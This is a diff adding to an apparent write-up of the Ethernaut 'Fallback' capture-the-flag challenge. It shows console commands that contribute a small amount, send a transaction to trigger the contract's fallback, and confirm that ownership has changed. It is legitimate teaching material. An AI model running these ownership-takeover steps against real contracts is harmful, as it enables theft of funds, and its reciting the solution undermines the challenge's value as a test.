@@ -59,3 +59,38 @@ await contract.owner()
 ```shell
 await contract.contribute({value: 4})
 ```
+This notification met me.
+
+<img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Fallback/img/contribute.png">
+
+```shell
+await contract.getContribution()
+Object { negative: 0, words: (2) […], length: 1, red: null }
+​
+length: 1
+​
+negative: 0
+​
+red: null
+​
+words: Array [ 4, <1 empty slot> ]
+​​
+0: 4
+​​
+length: 2
+​​
+<prototype>: Array []
+​
+<prototype>: Object { _init: _init(t, e, r), _initNumber: _initNumber(t, e, r), _initArray: _initArray(t, e, r), … }
+```
+### JSON RPC ETH
+
+```shell
+await contract.sendTransaction({value: 1})
+```
+```shell
+await contract.owner()
+"0x0C39eb3D6C0583AdA92e15C9e7610B609BBdF35b"
+```
+
+**_by wasny0ps_**
